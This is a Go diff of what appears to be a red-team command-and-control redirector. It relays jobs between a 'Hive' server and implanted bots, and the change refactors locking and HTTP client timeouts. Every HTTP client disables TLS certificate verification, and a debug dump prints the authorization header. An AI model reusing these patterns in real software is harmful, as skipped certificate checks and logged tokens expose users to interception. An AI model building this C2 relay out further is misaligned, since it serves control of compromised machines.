@@ -27,24 +27,36 @@ import (
 
 
 func connectHive(){
+
+	lock.mux.Lock()
+	lock.Lock = 1
+	lock.mux.Unlock()
 	
+	defer unlock()
 	//Get Any Jobs from Bots targeting this redirector
 	getHive()
 	
-	//Extra Debug
+	//Debug: Ccheck Jobs to hive
+	fmt.Println("ConnectHive: Before Rlocking HiveJobs")
+	fmt.Println(jobsToHive.Jobs)
 
-	fmt.Println("Finish get hive red...")
-
-	j := 0
 	jobsToHive.mux.Lock()
-	for i,_ := range jobsToHive.Jobs {
-		postHive(jobsToHive.Jobs[i])
-	}
-	jobsToHive.Jobs = jobsToHive.Jobs[:j]
+	tempJobs := jobsToHive.Jobs
+	jobsToHive.Jobs = jobsToHive.Jobs[:0]
 	jobsToHive.mux.Unlock()
-
+	
+	fmt.Println("ConnectHive: After Rlocking,start sending jobs...")
+	for i,_ := range tempJobs {
+		postHive(tempJobs[i])
+	}
+	
 }
 
+func unlock(){
+	lock.mux.Lock()
+	lock.Lock = 0
+	lock.mux.Unlock()
+}
 
 func getHive(){
 
@@ -55,9 +67,27 @@ func getHive(){
 		return
 	}
 
-	//Bypass unsecure self-signed certificate
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-	client := &http.Client{}
+	//HTTP Clients Conf
+	client := &http.Client{
+		Transport: &http.Transport{
+        	DialContext:(&net.Dialer{
+            	Timeout:   10 * time.Second,
+            	KeepAlive: 10 * time.Second,
+        	}).DialContext,
+
+        	//Skip TLS Verify since we are using self signed Certs
+        	TLSClientConfig:(&tls.Config{
+            	InsecureSkipVerify: true,
+        	}),
+
+        	TLSHandshakeTimeout:   20 * time.Second,   
+        	ExpectContinueTimeout: 10 * time.Second,
+        	ResponseHeaderTimeout: 10 * time.Second,	
+		},
+
+		Timeout: 30 * time.Second,
+	}
+
 	req, _ := http.NewRequest("GET", "https://"+redconfig.Roaster+"/red", nil)
 	req.Header.Set("Authorization", authbearer)
 	res, err := client.Do(req)
@@ -74,7 +104,6 @@ func getHive(){
 	}
 
 	//Mutex to avoid Race Conditions
-	
 	jobsToBichito.mux.Lock()
     jobsToBichito.Jobs = append(jobsToBichito.Jobs,newJobs...)
     jobsToBichito.mux.Unlock()
@@ -91,39 +120,59 @@ func getHive(){
 
 func postHive(job *Job){
 
-	fmt.Println("Starting posthive...")
 
 	result := checkTLSignature()
 	if result != "Good"{
 		return
 	}
 	
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-	
 	//Serialize Job, and send it to Hive
-	bytesRepresentation, err := json.Marshal(job)
-	if err != nil {
-		addLog("POST:Job json encoding Error"+err.Error())
-		return
+	bytesRepresentation := new(bytes.Buffer)
+	json.NewEncoder(bytesRepresentation).Encode(job)
+
+
+	//HTTP Clients Conf
+	client := &http.Client{
+		Transport: &http.Transport{
+        	DialContext:(&net.Dialer{
+            	Timeout:   10 * time.Second,
+            	KeepAlive: 10 * time.Second,
+        	}).DialContext,
+
+        	//Skip TLS Verify since we are using self signed Certs
+        	TLSClientConfig:(&tls.Config{
+            	InsecureSkipVerify: true,
+        	}),
+
+        	TLSHandshakeTimeout:   10 * time.Second,   
+        	ExpectContinueTimeout: 4 * time.Second,
+        	ResponseHeaderTimeout: 3 * time.Second,	
+		},
+
+		Timeout: 20 * time.Second,
 	}
 
-	client := &http.Client{}
-	req, _ := http.NewRequest("POST", "https://"+redconfig.Roaster+"/red",bytes.NewBuffer(bytesRepresentation))
+	req, _ := http.NewRequest("POST", "https://"+redconfig.Roaster+"/red",bytesRepresentation)
 	req.Header.Set("Authorization", authbearer)
-	_, err = client.Do(req)
+	
+	//Debug
+	fmt.Println("Performing POST to hive")
+	_, err := client.Do(req)
 	if err != nil {
+		fmt.Println(err.Error())
 		addLog("Post error"+err.Error())
 		return
 	}
 
-
+	
 	//Debug: Hive Post Request
 	requestDump, err2 := httputil.DumpRequest(req, true)
 	if err2 != nil {
   		fmt.Println(err)
 	}
 	fmt.Println(string(requestDump))
-    fmt.Println("Body: "+string(bytesRepresentation))
+    //fmt.Println("Body: "+bytesRepresentation.String())
+    
 
 
 }
@@ -135,9 +184,28 @@ func checking() string{
 	if result != "Good"{
 		return "Bad TLS"
 	}
-	//Bypass unsecure self-signed certificate
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-	client := &http.Client{}
+	
+	//HTTP Clients Conf
+	client := &http.Client{
+		Transport: &http.Transport{
+        	DialContext:(&net.Dialer{
+            	Timeout:   10 * time.Second,
+            	KeepAlive: 10 * time.Second,
+        	}).DialContext,
+
+        	//Skip TLS Verify since we are using self signed Certs
+        	TLSClientConfig:(&tls.Config{
+            	InsecureSkipVerify: true,
+        	}),
+
+        	TLSHandshakeTimeout:   10 * time.Second,   
+        	ExpectContinueTimeout: 4 * time.Second,
+        	ResponseHeaderTimeout: 3 * time.Second,	
+		},
+
+		Timeout: 20 * time.Second,
+	}
+	
 	req, _ := http.NewRequest("GET", "https://"+redconfig.Roaster+"/checking", nil)
 	req.Header.Set("Authorization", authbearer)
 	res, err := client.Do(req)
